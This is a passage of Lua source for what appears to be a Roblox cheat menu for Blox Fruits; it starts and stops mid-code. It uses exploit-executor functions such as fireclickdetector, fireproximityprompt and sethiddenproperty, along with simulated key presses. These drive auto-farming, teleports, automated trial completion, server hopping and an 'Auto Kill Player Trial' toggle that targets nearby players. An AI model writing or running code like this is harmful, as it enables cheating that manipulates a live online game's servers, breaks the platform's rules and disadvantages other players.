                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                        tween(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.CFrame)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.ClickDetector)
                        tween(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.CFrame)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                        fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                    end
                end
            end)
        end
    end)

    v2:AddToggle({
        Name = "Auto Material For Skull Guitar",
        Default = false,
        Callback = function(nguyenlieuskull)
            _G.nguyenlieuskull = nguyenlieuskull
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.nguyenlieuskull and GetWP("Skull Guitar") == false then
                    if LayMaterial("Bones") >= 500 and LayMaterial("Ectoplasm") >= 250 and LayMaterial("Dark Fragment") >= 1 then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("soulGuitarBuy", true)
                    elseif LayMaterial("Ectoplasm") <= 250 then
                        if _G.nguyenlieuskull and World2 then
                            local v11 = MobCheck({
                                "Ship Deckhand",
                                "Ship Engineer",
                                "Ship Steward",
                                "Ship Officer",
                                "Arctic Warrior",
                            })

                            if v11 then
                                repeat
                                    task.wait()
                                    Kill(v11, _G.nguyenlieuskull)
                                until not _G.nguyenlieuskull or not v11.Parent or v11.Humanoid.Health <= 0
                            else
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                            end
                        else
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
                        end
                    elseif LayMaterial("Dark Fragment") < 1 then
                        if _G.nguyenlieuskull and World2 then
                            local Darkbeard = MobCheck("Darkbeard")

                            if Darkbeard then
                                repeat
                                    task.wait()
                                    Kill(Darkbeard, _G.nguyenlieuskull)
                                until _G.nguyenlieuskull or Darkbeard.Humanoid.Health <= 0
                            else
                                tween(CFrame.new(3798.4575195313, 13.826690673828, -3399.806640625))
                            end
                        else
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
                        end

                        if not MobCheck("Darkbeard") then
                            Hop()
                        end
                    elseif LayMaterial("Bones") <= 500 then
                        if _G.nguyenlieuskull and World3 then
                            local v11 = MobCheck({
                                "Reborn Skeleton",
                                "Living Zombie",
                                "Demonic Soul",
                                "Possessed Mummy",
                            })

                            if v11 then
                                repeat
                                    task.wait()
                                    Kill(v11, _G.nguyenlieuskull)
                                until not _G.nguyenlieuskull or v11.Humanoid.Health <= 0 or not v11.Parent or v11.Humanoid.Health <= 0
                            else
                                tween(CFrame.new(-9504.8564453125, 172.14292907714844, 6057.259765625))
                            end
                        else
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
                        end
                    end
                end
            end)
        end
    end)

    v2:AddButton({
        Name = "Talk With Stone",
        Callback = function()
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Begin")
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Check")
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Teleport")
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Continue")
        end,
    })

    v2:AddSection("Race V4")
    local v11 = v2:AddParagraph("Tiers V4", "")

    spawn(function()
        pcall(function()
            while wait(0.2) do
                v11:Set(" Tiers: " .. localPlayer.Data.Race.C.Value)
            end
        end)
    end)

    v2:AddToggle({
        Name = "Auto Pull Lever",
        Default = false,
        Callback = function(lver)
            _G.Lver = lver
        end,
    })

    spawn(function()
        while wait(1) do
            if _G.Lver then
                pcall(function()
                    for k, descendant in pairs(workspace.Map["Temple of Time"]:GetDescendants()) do
                        if descendant.Name == "ProximityPrompt" then
                            fireproximityprompt(descendant, math.huge)
                        end
                    end
                end)
            end
        end
    end)

    v2:AddToggle({
        Name = "Auto Train V4",
        Default = false,
        Callback = function(ancientOne)
            _G.AncientOne = ancientOne
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                local tbl2, n, n2, n3, v12, n4
                n4 = 1

                while true do
                    if n4 == 1 then
                        if _G.AncientOne then
                            n4 = 2
                        else
                            n4 = 10
                        end
                    elseif n4 == 2 then
                        tbl2 = {
                            "Reborn Skeleton",
                            "Living Zombie",
                            "Demonic Soul",
                            "Possessed Mummy",
                        }

                        n = #tbl2 + 0
                        n2 = 0
                        n4 = 3
                    elseif n4 == 3 then
                        n3 = n2 + 1

                        if n3 <= n then
                            n4 = 4
                        else
                            n4 = 10
                        end
                    elseif n4 == 4 then
                        n2 = n3

                        if localPlayer.Character:FindFirstChild("RaceEnergy").Value == 1 then
                            n4 = 9
                        else
                            n4 = 5
                        end
                    elseif n4 == 5 then
                        if localPlayer.Character:FindFirstChild("RaceTransformed").Value == false then
                            n4 = 6
                        else
                            n4 = 3
                        end
                    elseif n4 == 6 then
                        v12 = MobCheck(tbl2)

                        if v12 then
                            n4 = 7
                        else
                            n4 = 8
                        end
                    elseif n4 == 7 then
                        wait()
                        Kill(v12, _G.AncientOne)

                        if _G.AncientOne ~= false and v12.Humanoid.Health > 0 and v12.Parent then
                            n4 = 7
                        else
                            n4 = 3
                        end
                    elseif n4 == 8 then
                        tween(CFrame.new(-9495.6806640625, 453.58624267578125, 5977.3486328125))
                        n4 = 3
                    elseif n4 == 9 then
                        VirtualInputManager:SendKeyEvent(true, "Y", false, game)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("UpgradeRace", "Buy")
                        tween(CFrame.new(-8987.041015625, 215.862060546875, 5886.71044921875))
                        n4 = 3
                    elseif n4 == 10 then
                        return
                    end
                end
            end)
        end
    end)

    v2:AddToggle({
        Name = "Teleport to Temple of Time",
        Default = false,
        Callback = function(tpTemple)
            _G.TPTemple = tpTemple
            if not tpTemple then
                return
            end

            task.spawn(function()
                while _G.TPTemple do
                    task.wait(1)

                    pcall(function()
                        local character = localPlayer.Character
                        local result = character or localPlayer.CharacterAdded:Wait()
                        local humanoidRootPart2 = result:FindFirstChild("HumanoidRootPart")
                        if not humanoidRootPart2 then
                            return
                        end
                        local Workspace = game:GetService("Workspace")
                        local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
                        local map = Workspace:FindFirstChild("Map")
                        if not map then
                            return
                        end

                        if World3 and not map:FindFirstChild("Temple of Time") then
                            local mapStash = ReplicatedStorage2:FindFirstChild("MapStash")

                            if mapStash and mapStash:FindFirstChild("Temple of Time") then
                                mapStash["Temple of Time"].Parent = map
                            end
                        end

                        humanoidRootPart2.CFrame = CFrame.new(28286.35546875, 14895.3017578125, 102.62469482421875)
                    end)
                end
            end)
        end,
    })

    v2:AddToggle({
        Name = "Teleport to Ancient One",
        Default = false,
        Callback = function(tpAncientOne)
            _G.TP_AncientOne = tpAncientOne

            if tpAncientOne then
                tween(CFrame.new(28981.552734375, 14888.4267578125, -120.245849609375))
                task.wait(0.5)
                _G.TP_AncientOne = false
            end
        end,
    })

    v2:AddToggle({
        Name = "Teleport to Ancient Clock",
        Default = false,
        Callback = function(tpClock)
            _G.TP_Clock = tpClock

            if tpClock then
                tween(CFrame.new(29549, 15069, -88))
                task.wait(0.5)
                _G.TP_Clock = false
            end
        end,
    })

    v2:AddToggle({
        Name = "Tween to Race Doors",
        Default = false,
        Callback = function(tpDoor)
            _G.TPDoor = tpDoor
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.TPDoor then
                    if tostring(localPlayer.Data.Race.Value) == "Mink" then
                        tween(CFrame.new(29020.66015625, 14889.4267578125, -379.2682800292969))
                    elseif tostring(localPlayer.Data.Race.Value) == "Fishman" then
                        tween(CFrame.new(28224.056640625, 14889.4267578125, -210.5872039794922))
                    elseif tostring(localPlayer.Data.Race.Value) == "Cyborg" then
                        tween(CFrame.new(28492.4140625, 14894.4267578125, -422.1100158691406))
                    elseif tostring(localPlayer.Data.Race.Value) == "Skypiea" then
                        tween(CFrame.new(28967.408203125, 14918.0751953125, 234.31198120117188))
                    elseif tostring(localPlayer.Data.Race.Value) == "Ghoul" then
                        tween(CFrame.new(28672.720703125, 14889.1279296875, 454.5961608886719))
                    elseif tostring(localPlayer.Data.Race.Value) == "Human" then
                        tween(CFrame.new(29237.294921875, 14889.4267578125, -206.94955444335938))
                    end
                end
            end)
        end
    end)

    v2:AddToggle({
        Name = "Auto Complete Trial",
        Default = false,
        Callback = function(autotrial)
            _G.autotrial = autotrial
        end,
    })

    GetSeaBeastTrial = function()
        if not workspace.Map:FindFirstChild("FishmanTrial") then
            return nil
        end

        if workspace._WorldOrigin.Locations:FindFirstChild("Trial of Water") then
            local trialOfWater = workspace._WorldOrigin.Locations:FindFirstChild("Trial of Water")
            FishmanTrial = trialOfWater
        end

        if FishmanTrial then
            local v12 = next
            local children, v13 = workspace.SeaBeasts:GetChildren()

            for k, v14 in v12, children, v13 do
                if v14:FindFirstChild("HumanoidRootPart") and (v14.HumanoidRootPart.Position - FishmanTrial.Position).Magnitude <= 1500 and v14.Health.Value > 0 then
                    return v14
                end
            end
        end
    end

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.autotrial and tostring(localPlayer.Data.Race.Value) == "Mink" then
                    fn(workspace.Map.MinkTrial.Ceiling.CFrame * CFrame.new(0, -20, 0))
                end
            end)
        end
    end)

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.autotrial and tostring(localPlayer.Data.Race.Value) == "Fishman" and GetSeaBeastTrial() then
                    local position

                    repeat
                        task.wait()

                        spawn(function()
                            tween(CFrame.new(GetSeaBeastTrial().HumanoidRootPart.Position.X, game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y + 300, GetSeaBeastTrial().HumanoidRootPart.Position.Z))
                        end)

                        position = GetSeaBeastTrial().HumanoidRootPart.Position
                        MousePos = position
                        _S("Melee", "Z")
                        _S("Melee", "X")
                        _S("Melee", "C")
                        wait(0.1)
                        _S("Sword", "Z")
                        _S("Sword", "X")
                        wait(0.1)
                        _S("Blox Fruit", "Z")
                        _S("Blox Fruit", "X")
                        _S("Blox Fruit", "C")
                        wait(0.1)
                        _S("Gun", "Z")
                        _S("Gun", "X")
                    until _G.autotrial == false or not GetSeaBeastTrial()
                end
            end)
        end
    end)

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.autotrial and tostring(localPlayer.Data.Race.Value) == "Cyborg" then
                    tween(workspace.Map.CyborgTrial.Floor.CFrame * CFrame.new(0, 500, 0))
                end
            end)
        end
    end)

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.autotrial and tostring(localPlayer.Data.Race.Value) == "Skypiea" then
                    fn(workspace.Map.SkyTrial.Model.FinishPart.CFrame)
                end
            end)
        end
    end)

    spawn(function()
        while wait(0.1) do
            pcall(function()
                if _G.autotrial and (tostring(localPlayer.Data.Race.Value) == "Human" or tostring(localPlayer.Data.Race.Value) == "Ghoul") then
                    local v12 = MobCheck({"Ancient Vampire", "Ancient Zombie"})

                    if v12 then
                        repeat
                            wait()
                            Kill(v12, _G.autotrial)
                        until _G.autotrial == false or not v12.Parent or v12.Humanoid.Health <= 0
                    end
                end
            end)
        end
    end)

    v2:AddToggle({
        Name = "Auto Kill Player Trial",
        Default = false,
        Callback = function(defeating)
            _G.Defeating = defeating
        end,
    })

    spawn(function()
        while task.wait(1) do
            pcall(function()
                local v12, v13, v14, v15, v16, v17, n
                n = 1

                while true do
                    if n == 1 then
                        if _G.Defeating then
                            n = 2
                        else
                            n = 6
                        end
                    elseif n == 2 then
                        v12, v13, v14 = pairs(workspace.Characters:GetChildren())
                        v15 = v14
                        n = 3
                    elseif n == 3 then
                        v16, v17 = v12(v13, v15)

                        if v16 == nil then
                            n = 6
                        else
                            n = 4
                        end
                    elseif n == 4 then
                        v15 = v16

                        if v17.Name ~= localPlayer.Name and v17.Humanoid.Health > 0 and v17:FindFirstChild("HumanoidRootPart") and v17.Parent and (humanoidRootPart.Position - v17.HumanoidRootPart.Position).Magnitude <= 250 then
                            n = 5
                        else
                            n = 3
                        end
                    elseif n == 5 then
                        task.wait()
                        EquipWeapon(_G.SelectWeapon)
                        tween(v17.HumanoidRootPart.CFrame * CFrame.new(0, 0, 15))
                        sethiddenproperty(localPlayer, "SimulationRadius", math.huge)

                        if _G.Defeating ~= false and v17.Humanoid.Health > 0 and v17.Parent and v17:FindFirstChild("HumanoidRootPart") and v17:FindFirstChild("Humanoid") then
                            n = 5
                        else
                            n = 3
                        end
                    elseif n == 6 then
                        return
                    end
                end
            end)
        end
    end)

    v:AddSection("Sea")

    v:AddToggle({
        Name = "Auto Farm Sea",
        Default = false,
        Callback = function(autoSeaEvent)
            _G.AutoSeaEvent = autoSeaEvent

            if not autoSeaEvent then
                _G.Shark = false
                _G.Piranha = false
                _G.TerrorShark = false
                _G.MobCrew = false
                _G.HCM = false
                _G.PGB = false
                _G.FishBoat = false
                _G.seabeatfarm = false
            end
        end,
    })

    v:AddToggle({
        Name = "Auto Drive Boat",
        Default = false,
        Callback = function(sailBoats)
            _G.SailBoats = sailBoats
        end,
    })

    v:AddSection("Farm Select")

    v:AddDropdown({
        Name = "Fishs",
        Default = {},
        Options = {
            "Shark",
            "Piranha",
            "Terror Shark",
            "Fish Crew",
            "Haunted Crew",
            "Pirate Brigade",
            "Fish Boat",
            "Sea Beast",
        },
        MultiSelect = true,
        Callback = function(arg)
            if not _G.AutoSeaEvent then
                return
            end
            _G.Shark = arg.Shark
            _G.Piranha = arg.Piranha
            _G.TerrorShark = arg["Terror Shark"]
            _G.MobCrew = arg["Fish Crew"]
            _G.HCM = arg["Haunted Crew"]
            _G.PGB = arg["Pirate Brigade"]
            _G.FishBoat = arg["Fish Boat"]
            _G.seabeatfarm = arg["Sea Beast"]
        end,
    })

    local options = {
        "Guardian",
        "PirateGrandBrigade",
        "MarineGrandBrigade",
        "PirateBrigade",
        "MarineBrigade",
        "PirateSloop",
        "MarineSloop",
        "Beast Hunter",
    }

    local addDropdown = v.AddDropdown
    local tbl2 = {Name = "Select Boats"}
    local v12 = options[1]
    local default = v12 or "Guardian"
    tbl2.Default = default
    tbl2.Options = options

    tbl2.Callback = function(selectedBoat)
        _G.SelectedBoat = selectedBoat
    end

    addDropdown(v, tbl2)

    v:AddDropdown({
        Name = "Select Weapon Skill",
        Default = {Melee = true, Sword = true, Gun = true, Fruit = false},
        Options = {"Melee", "Sword", "Gun", "Fruit"},
        MultiSelect = true,
        Callback = function(arg)
            _G.UseMelee = arg.Melee
            _G.UseSword = arg.Sword
            _G.UseGun = arg.Gun
            _G.UseFruit = arg.Fruit
        end,
    })

    v:AddSlider({
        Name = "Skill Hold Time",
        Default = 0.1,
        Min = 0,
        Max = 2,
        Increase = 0.1,
        Callback = function(arg)
            HNCU = arg
        end,
    })

    v:AddSlider({
        Name = "Switch Tool Delay",
        Default = 3,
        Min = 1,
        Max = 10,
        Increase = 1,
        Callback = function(arg)
            NoSkid = arg
        end,
    })

    local RunService = game:GetService("RunService")
    local n = nil
    local connection = nil

    v:AddToggle({
        Name = "Lock Boat Y +100",
        Default = false,
        Callback = function(lockBoatY)
            _G.LockBoatY = lockBoatY

            if connection then
                connection:Disconnect()
                connection = nil
            end

            if lockBoatY then
                connection = RunService.Heartbeat:Connect(function()
                    local v13 = CheckBoat()

                    if v13 then
                        local vehicleSeat = v13:FindFirstChildWhichIsA("VehicleSeat")

                        if vehicleSeat then
                            if not v13.PrimaryPart then
                                v13.PrimaryPart = vehicleSeat
                            end

                            if not n then
                                n = vehicleSeat.Position.Y + 100
                            end

                            local primaryPart = v13.PrimaryPart
                            local position = primaryPart.Position
                            local cFrame = primaryPart.CFrame
                            primaryPart.CFrame = CFrame.new(position.X, n, position.Z) * (cFrame - cFrame.Position)
                            primaryPart.AssemblyLinearVelocity = Vector3.new(primaryPart.AssemblyLinearVelocity.X, 0, primaryPart.AssemblyLinearVelocity.Z)
                        end
                    else
                        n = nil
                    end
                end)
            else
                n = nil
            end
        end,
    })

    v:AddToggle({
        Name = "Highlight My Boat",
        Default = false,
        Callback = function(espMyBoat)
            _G.EspMyBoat = espMyBoat
        end,
    })

    local RunService2 = game:GetService("RunService")
    local tbl3 = {}

    createESP = function(adornee)
        if tbl3[adornee] then
            return
        end
        local highlight = Instance.new("Highlight")
        highlight.FillColor = Color3.fromRGB(255, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.Adornee = adornee
        highlight.Parent = adornee
        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Size = UDim2.new(0, 200, 0, 50)
        billboardGui.StudsOffset = Vector3.new(0, 5, 0)
        billboardGui.AlwaysOnTop = true
        billboardGui.Parent = adornee
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = "My Boat"
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBold
        textLabel.TextStrokeTransparency = 0
        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        textLabel.Parent = billboardGui
        tbl3[adornee] = {highlight, billboardGui}
    end

    removeESP = function(arg)
        if tbl3[arg] then
            for k, v13 in pairs(tbl3[arg]) do
                v13:Destroy()
            end

            tbl3[arg] = nil
        end
    end

    removeAllESP = function()
        for k in pairs(tbl3) do
            removeESP(k)
        end
    end

    checkBoat = function()
        if not _G.EspMyBoat then
            removeAllESP()
            return
        end
        local character = localPlayer.Character
        local humanoidRootPart2 = character and character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return
        end
        local tbl4 = {}

        for k, child in pairs(workspace.Boats:GetChildren()) do
            local owner = child:FindFirstChild("Owner")
            local vehicleSeat = child:FindFirstChildWhichIsA("VehicleSeat")

            if owner and tostring(owner.Value) == tostring(localPlayer.Name) and vehicleSeat and (vehicleSeat.Position - humanoidRootPart2.Position).Magnitude <= 1000 then
                tbl4[child] = true
                createESP(child)
            end
        end

        for k in pairs(tbl3) do
            if not tbl4[k] then
                removeESP(k)
            end
        end
    end

    v:AddSection("Settings [ Wait ]")
    v:AddSection("Configs")

    local options2 = {
        "Lv 1",
        "Lv 2",
        "Lv 3",
        "Lv 4",
        "Lv 5",
        "Lv 6",
        "Lv Infinite",
    }

    local addDropdown2 = v.AddDropdown
    local tbl4 = {Name = "Select Sea Level"}
    local v13 = options2[1]
    local default2 = v13 or "Lv 1"
    tbl4.Default = default2
    tbl4.Options = options2

    tbl4.Callback = function(dangerSc)
        _G.DangerSc = dangerSc
    end

    addDropdown2(v, tbl4)

    v:AddSlider({
        Name = "Boat Tween Speed",
        Min = 100,
        Max = 350,
        Default = GetSetting("TweenSpeed2", 200),
        Increase = 1,
        Callback = function(tweenSpeed2)
            _G.TweenSpeed2 = tweenSpeed2
            _G.SaveData.TweenSpeed2 = tweenSpeed2
            SaveSettings()
        end,
    })

    v:AddSection("NPCs")

    v:AddDropdown({
        Name = "Select NPC",
        Options = {
            "Spy",
            "Beast Hunter",
            "Shark Hunter",
            "Shipwright Teacher",
        },
        Default = "Spy",
        Callback = function(npcMode)
            _G.NpcMode = npcMode
        end,
    })

    v:AddToggle({
        Name = "Teleport To NPC",
        Default = false,
        Callback = function(teleportNpcSea)
            _G.TeleportNpcSea = teleportNpcSea
            StopTween(_G.TeleportNpcSea)
        end,
    })

    spawn(function()
        while wait() do
            if _G.TeleportNpcSea and World3 then
                local npcMode = _G.NpcMode

                if npcMode == "Spy" then
                    tween(CFrame.new(-16470.1289, 528.018005, 539.729736, 0.923504472, 0.14256525, -0.356110483, -0.12577644, 0.989586353, 0.0699937791, 0.362380743, -0.0198492594, 0.931818783))
                elseif npcMode == "Beast Hunter" then
                    tween(CFrame.new(-16282.7754, 72.8005219, 262.864899, 0.999961197, 1.3790713e-09, -0.00881191809, -9.40171052e-10, 1, 4.98117245e-08, 0.00881191809, -4.98015034e-08, 0.999961197))
                elseif npcMode == "Shark Hunter" then
                    tween(CFrame.new(-16526.1348, 108.07634, 750.895447, -0.997955203, 9.56297868e-08, -0.0639176369, 9.5004161e-08, 1, 1.28273223e-08, 0.0639176369, 6.72865097e-09, -0.997955203))
                elseif npcMode == "Shipwright Teacher" then
                    tween(CFrame.new(-16526, 78.5615463, 304.426758, -0.997302055, -0.0361390784, -0.0638951063, -0.0359273851, 0.999344468, -0.00445934385, 0.0640143752, -0.00215172861, -0.99794668))
                end
            end
        end
    end)

    v:AddSection("Draco Race")

    GetQuestDracoLevel = function()
        return ReplicatedStorage.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({{NPC = "Dragon Wizard", Command = "Upgrade"}}))
    end

    v:AddToggle({
        Name = "Tween To Upgrade Draco Trial",
        Default = false,
        Callback = function(upgDrago)
            _G.UPGDrago = upgDrago
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.UPGDrago then
                    if GetQuestDracoLevel() == false then
                        return nil
                    end

                    if GetQuestDracoLevel() == true then
                        if (CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938).Position - humanoidRootPart.Position).Magnitude >= 300 then
                            tween(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
                        else
                            tween(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
                            ReplicatedStorage.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({{NPC = "Dragon Wizard", Command = "Upgrade"}}))
                        end
                    end
                end
            end)
        end
    end)

    v:AddToggle({
        Name = "Auto Draco V1",
        Default = false,
        Callback = function(dracov1)
            _G.dracov1 = dracov1
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.dracov1 and LayMaterial("Dragon Egg") <= 0 then
                    repeat
                        wait()
                        _G.Prehis_Find = true
                        _G.Prehis_Skills = true
                        _G.Prehis_DE = true
                    until not _G.dracov1 or LayMaterial("Dragon Egg") >= 1

                    _G.Prehis_Find = false
                    _G.Prehis_Skills = false
                    _G.Prehis_DE = false
                end
            end)
        end
    end)

    v:AddToggle({
        Name = "Auto Draco V2",
        Default = false,
        Callback = function(autoFireFlowers)
            _G.AutoFireFlowers = autoFireFlowers
        end,
    })

    spawn(function()
        local fireFlowers, v14, v15, v16, v17, v18, v19, v20, position, n2
        n2 = 1

        while true do
            if n2 == 1 then
                if wait(1) then
                    n2 = 2
                else
                    n2 = 13
                end
            elseif n2 == 2 then
                if _G.AutoFireFlowers then
                    n2 = 3
                else
                    n2 = 1
                end
            elseif n2 == 3 then
                fireFlowers = workspace:FindFirstChild("FireFlowers")
                v14 = MobCheck("Forest Pirate")

                if v14 then
                    n2 = 4
                else
                    n2 = 5
                end
            elseif n2 == 4 then
                wait()
                Kill(v14, _G.AutoFireFlowers)

                if _G.AutoFireFlowers and v14.Parent and v14.Humanoid.Health > 0 and not fireFlowers then
                    n2 = 4
                else
                    n2 = 6
                end
            elseif n2 == 5 then
                tween(CFrame.new(-13206.452148438, 425.89199829102, -7964.5537109375))
                n2 = 6
            elseif n2 == 6 then
                if fireFlowers then
                    n2 = 7
                else
                    n2 = 1
                end
            elseif n2 == 7 then
                v15, v16, v17 = pairs(fireFlowers:GetChildren())
                v18 = v17
                n2 = 8
            elseif n2 == 8 then
                v19, v20 = v15(v16, v18)

                if v19 == nil then
                    n2 = 1
                else
                    n2 = 9
                end
            elseif n2 == 9 then
                v18 = v19

                if v20:IsA("Model") and v20.PrimaryPart then
                    n2 = 10
                else
                    n2 = 8
                end
            elseif n2 == 10 then
                position = v20.PrimaryPart.Position

                if (position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
                    n2 = 12
                else
                    n2 = 11
                end
            elseif n2 == 11 then
                tween(CFrame.new(position))
                n2 = 8
            elseif n2 == 12 then
                VirtualInputManager:SendKeyEvent(true, "E", false, game)
                wait(1.5)
                VirtualInputManager:SendKeyEvent(false, "E", false, game)
                n2 = 8
            elseif n2 == 13 then
                return
            end
        end
    end)

    v:AddToggle({
        Name = "Auto Draco V3",
        Default = false,
        Callback = function(dragoV3)
            _G.DragoV3 = dragoV3
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.DragoV3 then
                    repeat
                        wait()
                        _G.DangerSc = "Lv Infinite"
                        _G.SailBoats = true
                        _G.TerrorShark = true
                    until not _G.DragoV3

                    _G.DangerSc = "Lv 1"
                    _G.SailBoats = false
                    _G.TerrorShark = false
                end
            end)
        end
    end)

    v:AddToggle({
        Name = "Auto Trial Draco",
        Default = false,
        Callback = function(relic123)
            _G.Relic123 = relic123
        end,
    })

    spawn(function()
        while wait(1) do
            if _G.Relic123 then
                pcall(function()
                    if workspace.Map:FindFirstChild("DracoTrial") then
                        ReplicatedStorage.Remotes.DracoTrial:InvokeServer()
                        wait(0.5)

                        repeat
                            wait()
                            tween(CFrame.new(-39934.9765625, 10685.359375, 22999.34375))
                        until not _G.Relic123 or humanoidRootPart.Position == CFrame.new(-39934.9765625, 10685.359375, 22999.34375).Position

                        repeat
                            wait()
                            tween(CFrame.new(-40511.25390625, 9376.4013671875, 23458.37890625))
                        until not _G.Relic123 or humanoidRootPart.Position == CFrame.new(-40511.25390625, 9376.4013671875, 23458.37890625).Position

                        wait(2.5)

                        repeat
                            wait()
                            tween(CFrame.new(-39914.65625, 10685.384765625, 23000.177734375))
                        until not _G.Relic123 or humanoidRootPart.Position == CFrame.new(-39914.65625, 10685.384765625, 23000.177734375).Position

                        repeat
                            wait()
                            tween(CFrame.new(-40045.83203125, 9376.3984375, 22791.287109375))
                        until not _G.Relic123 or humanoidRootPart.Position == CFrame.new(-40045.83203125, 9376.3984375, 22791.287109375).Position

                        wait(2.5)

                        repeat
                            wait()
                            tween(CFrame.new(-39908.5, 10685.4052734375, 22990.04296875))
                        until not _G.Relic123 or humanoidRootPart.Position == CFrame.new(-39908.5, 10685.4052734375, 22990.04296875).Position

                        repeat
                            wait()
                            tween(CFrame.new(-39609.5, 9376.400390625, 23472.94335975))
                        until not _G.Relic123 or humanoidRootPart.Position == CFrame.new(-39609.5, 9376.400390625, 23472.94335975).Position
                    else
                        local trialTeleport = workspace.Map.PrehistoricIsland:FindFirstChild("TrialTeleport")

                        if trialTeleport and trialTeleport:IsA("Part") then
                            tween(CFrame.new(trialTeleport.Position))
                        end
                    end
                end)
            end
        end
    end)

    v:AddToggle({
        Name = "Auto Train Draco",
        Default = false,
        Callback = function(trainDrago)
            _G.TrainDrago = trainDrago
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                local tbl5, n2, n3, n4, v14, n5
                n5 = 1

                while true do
                    if n5 == 1 then
                        if _G.TrainDrago then
                            n5 = 2
                        else
                            n5 = 10
                        end
                    elseif n5 == 2 then
                        tbl5 = {"Venomous Assailant", "Hydra Enforcer"}
                        n2 = #tbl5 + 0
                        n3 = 0
                        n5 = 3
                    elseif n5 == 3 then
                        n4 = n3 + 1

                        if n4 <= n2 then
                            n5 = 4
                        else
                            n5 = 10
                        end
                    elseif n5 == 4 then
                        n3 = n4

                        if localPlayer.Character:FindFirstChild("RaceEnergy").Value == 1 then
                            n5 = 9
                        else
                            n5 = 5
                        end
                    elseif n5 == 5 then
                        if localPlayer.Character:FindFirstChild("RaceTransformed").Value == false then
                            n5 = 6
                        else
                            n5 = 3
                        end
                    elseif n5 == 6 then
                        v14 = MobCheck(tbl5)

                        if v14 then
                            n5 = 7
                        else
                            n5 = 8
                        end
                    elseif n5 == 7 then
                        wait()
                        Kill(v14, _G.TrainDrago)

                        if _G.TrainDrago ~= false and v14.Humanoid.Health > 0 and v14.Parent then
                            n5 = 7
                        else
                            n5 = 3
                        end
                    elseif n5 == 8 then
                        tween(CFrame.new(4620.61572265625, 1002.2954711914062, 399.0868835449219))
                        n5 = 3
                    elseif n5 == 9 then
                        VirtualInputManager:SendKeyEvent(true, "Y", false, game)
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Buy", 2)
                        tween(CFrame.new(4620.61572265625, 1002.2954711914062, 399.0868835449219))
                        n5 = 3
                    elseif n5 == 10 then
                        return
                    end
                end
            end)
        end
    end)

    v:AddToggle({
        Name = "Tween to Draco Trial",
        Default = false,
        Callback = function(tpDragoPrehis)
            _G.TpDrago_Prehis = tpDragoPrehis
        end,
    })

    spawn(function()
        while wait(1) do
            if _G.TpDrago_Prehis then
                local trialTeleport = workspace.Map.PrehistoricIsland:FindFirstChild("TrialTeleport")

                if trialTeleport and trialTeleport:IsA("Part") then
                    tween(CFrame.new(trialTeleport.Position))
                end
            end
        end
    end)

    v:AddToggle({
        Name = "Change To Draco Race",
        Default = false,
        Callback = function(buydracorace)
            _G.buydracorace = buydracorace
        end,
    })

    spawn(function()
        while wait(1) do
            if _G.buydracorace then
                pcall(function()
                    if (CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938).Position - humanoidRootPart.Position).Magnitude >= 300 then
